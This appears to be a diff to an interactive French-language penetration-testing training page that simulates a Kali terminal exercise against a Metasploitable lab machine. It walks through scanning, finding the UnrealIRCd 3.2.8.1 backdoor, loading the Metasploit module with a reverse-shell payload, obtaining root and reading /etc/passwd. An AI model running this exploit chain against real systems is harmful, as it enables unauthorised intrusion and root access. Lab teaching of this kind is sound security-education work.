@@ -343,4 +343,150 @@
       hint:"Même outil que dans les cours précédents : -sV + -sC.",
       hint2:"nmap -sV -sC 192.168.56.20",
       note:"nmap -sV -sC &lt;cible&gt; → point de départ standard.",
-          
+      output:[
+        {t:"PORT     STATE SERVICE     VERSION", c:"o"},
+        {t:"21/tcp   open  ftp         vsftpd 2.3.4", c:"o"},
+        {t:"22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1", c:"o"},
+        {t:"23/tcp   open  telnet      Linux telnetd", c:"o"},
+        {t:"80/tcp   open  http        Apache httpd 2.2.8", c:"o"},
+        {t:"111/tcp  open  rpcbind     2 (RPC #100000)", c:"o"},
+        {t:"139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X", c:"o"},
+        {t:"445/tcp  open  netbios-ssn Samba smbd 3.0.20-Debian", c:"o"},
+        {t:"1524/tcp open  ingreslock?", c:"o"},
+        {t:"2049/tcp open  nfs         2-4 (RPC #100003)", c:"o"},
+        {t:"3306/tcp open  mysql       MySQL 5.0.51a-3ubuntu5", c:"o"},
+        {t:"5432/tcp open  postgresql  PostgreSQL DB 8.3.0 - 8.3.7", c:"o"},
+        {t:"5900/tcp open  vnc         VNC (protocol 3.3)", c:"o"},
+        {t:"6667/tcp open  irc         UnrealIRCd 3.2.8.1", c:"o", id:"hl-irc"},
+        {t:"8180/tcp open  http        Apache Tomcat/Coyote JSP engine 1.1", c:"o"}
+      ] },
+
+    { kind:"type", phase:"recon", context:"kali@kali", prompt:"$",
+      task:"Un service a une version très précise, connue pour être vulnérable. Tape son numéro de port.",
+      accepted:["6667"],
+      wrongAnswers:{
+        "21":"vsftpd a une autre faille connue — ce n'est pas notre cible ici.",
+        "23":"Telnet n'a pas de version précise documentée comme vulnérable ici.",
+        "80":"Apache n'est pas la cible.",
+        "3306":"MySQL demande des identifiants."
+      },
+      hint:"Cherche un service avec une version très précise et isolée, sur un port bien identifié.",
+      hint2:"6667/tcp = UnrealIRCd 3.2.8.1 — version exacte connue pour une backdoor injectée dans l'archive officielle.",
+      highlightIds:["hl-irc"],
+      note:"UnrealIRCd 3.2.8.1 → version piégée : un module Metasploit documenté existe pour cette version.",
+      output:[] },
+
+    { kind:"type", phase:"recherche", context:"kali@kali", prompt:"$",
+      task:"Cherche des exploits publics pour ce service.",
+      accepted:["searchsploit unrealircd"],
+      hint:"Base locale d'exploits Kali. Mot-clé = nom du service.",
+      hint2:"searchsploit unrealircd",
+      note:"searchsploit &lt;service&gt; → recherche par mot-clé dans la base d'exploits locale.",
+      output:[
+        {t:"UnrealIRCd 3.2.8.1 - Backdoor Command Execution        | linux/remote/16921.rb", c:"o"},
+        {t:"UnrealIRCd 3.2.8.1 - Backdoor Command Execution (MSF)  | linux/remote/17900.rb", c:"o", id:"hl-msf"}
+      ] },
+
+    { kind:"type", phase:"recherche", context:"kali@kali", prompt:"$",
+      task:"Un des deux résultats est déjà packagé pour Metasploit. Tape son identifiant (fin du chemin).",
+      accepted:["17900.rb"],
+      wrongAnswers:{
+        "16921.rb":"Ce chemin n'est pas packagé pour Metasploit — regarde le titre qui précise (MSF)."
+      },
+      hint:"Regarde le titre : une ligne mentionne explicitement (MSF).",
+      hint2:"17900.rb — le titre précise (MSF), c'est un module Metasploit prêt à charger.",
+      highlightIds:["hl-msf"],
+      note:"Un chemin en .rb avec mention (MSF) = module déjà prêt pour Metasploit.",
+      output:[] },
+
+    { kind:"type", phase:"recherche", context:"kali@kali", prompt:"$",
+      task:"Lance la console Metasploit.",
+      accepted:["msfconsole"],
+      hint:"Le framework interactif, une seule commande depuis Kali.",
+      note:"msfconsole → console interactive de Metasploit.",
+      output:[
+        {t:"=[ metasploit v6.4.135-dev ]", c:"o"}
+      ] },
+
+    { kind:"type", phase:"recherche", context:"msf", prompt:">",
+      task:"Cherche le module correspondant dans Metasploit.",
+      accepted:["search unrealircd"],
+      hint:"Recherche par mot-clé dans la console msf.",
+      note:"search &lt;mot-clé&gt; → cherche un module dans la base intégrée de Metasploit.",
+      output:[
+        {t:"0  exploit/unix/irc/unreal_ircd_3281_backdoor  2010-06-12  excellent  Yes", c:"o"}
+      ] },
+
+    { kind:"type", phase:"config", context:"msf", prompt:">",
+      task:"Charge le module.",
+      accepted:["use exploit/unix/irc/unreal_ircd_3281_backdoor", "use 0"],
+      hint:"use + chemin complet du module.",
+      note:"use &lt;chemin/module&gt; → charge un module dans la console.",
+      output:[] },
+
+    { kind:"type", phase:"config", context:"msf exploit(unreal_ircd_3281_backdoor)", prompt:">",
+      task:"Définis le payload : shell Unix brut en reverse (pas meterpreter).",
+      accepted:["set payload cmd/unix/reverse"],
+      hint:"Le service IRC ne supporte pas meterpreter. Cherche un payload de type shell Unix brut qui fait un reverse.",
+      hint2:"set payload cmd/unix/reverse",
+      note:"set payload cmd/unix/reverse → payload de type shell Unix brut avec connexion retour (adapté aux services incompatibles avec meterpreter).",
+      output:[{t:"payload => cmd/unix/reverse", c:"ok"}] },
+
+    { kind:"type", phase:"config", context:"msf exploit(unreal_ircd_3281_backdoor)", prompt:">",
+      task:"Définis la cible (RHOSTS).",
+      accepted:["set rhosts 192.168.56.20"],
+      hint:"Variable standard pour l'hôte distant.",
+      note:"RHOSTS = adresse de la cible.",
+      output:[{t:"RHOSTS => 192.168.56.20", c:"ok"}] },
+
+    { kind:"type", phase:"config", context:"msf exploit(unreal_ircd_3281_backdoor)", prompt:">",
+      task:"Définis LHOST (ton IP, pour le reverse shell).",
+      accepted:["set lhost 192.168.56.10"],
+      hint:"Ton adresse, pour que la cible rappelle Kali.",
+      note:"LHOST = ta propre adresse.",
+      output:[{t:"LHOST => 192.168.56.10", c:"ok"}] },
+
+    { kind:"type", phase:"exploitation", context:"msf exploit(unreal_ircd_3281_backdoor)", prompt:">",
+      task:"Lance l'exploit.",
+      accepted:["run", "exploit"],
+      hint:"Verbe d'action — run ou exploit.",
+      note:"run / exploit → lance le module.",
+      output:[
+        {t:"[*] Started reverse TCP handler on 192.168.56.10:4444", c:"o"},
+        {t:"[+] Backdoor triggered! Command execution confirmed", c:"ok"},
+        {t:"[*] Command shell session 1 opened (192.168.56.10:4444 -> 192.168.56.20:42617)", c:"ok", id:"hl-session"}
+      ] },
+
+    { kind:"type", phase:"post-exploitation", context:"root@metasploitable", prompt:"#",
+      task:"Vérifie l'identité obtenue.",
+      accepted:["id", "whoami"],
+      hint:"Commande courte, déjà vue.",
+      hint2:"id affiche l'identité et les groupes ; whoami seulement le nom.",
+      note:"id / whoami → vérifie l'identité effective du shell.",
+      output:[{t:"uid=0(root) gid=0(root) groups=0(root)", c:"ok"}] }
+  ];
+
+  let freeContext = "root@metasploitable";
+  const freeCommands = {
+    "root@metasploitable": {
+      "whoami": [{t:"root", c:"ok"}],
+      "id": [{t:"uid=0(root) gid=0(root) groups=0(root)", c:"ok"}],
+      "pwd": [{t:"/", c:"o"}],
+      "ls /": [{t:"bin  boot  dev  etc  home  lib  media  mnt  opt  proc  root  sbin  srv  sys  tmp  usr  var", c:"o"}],
+      "uname -a": [{t:"Linux metasploitable 2.6.24-16-server #1 SMP i686 GNU/Linux", c:"o"}],
+      "hostname": [{t:"metasploitable", c:"o"}],
+      "cat /etc/passwd": [
+        {t:"root:x:0:0:root:/root:/bin/bash", c:"o"},
+        {t:"…", c:"o"},
+        {t:"msfadmin:x:1000:1000:msfadmin,,,:/home/msfadmin:/bin/bash", c:"o"}
+      ],
+      "exit": [{t:"(session terminée)", c:"o"}]
+    }
+  };
+
+  let freeHintHtml = "Session root ouverte. Tape <strong style=\"color:var(--text)\">whoami</strong>, <strong style=\"color:var(--text)\">id</strong>, <strong style=\"color:var(--text)\">ls /</strong> ou <strong style=\"color:var(--text)\">exit</strong>.";
+</script>
+<script src="engine.js"></script>
+
+</body>
+</html>
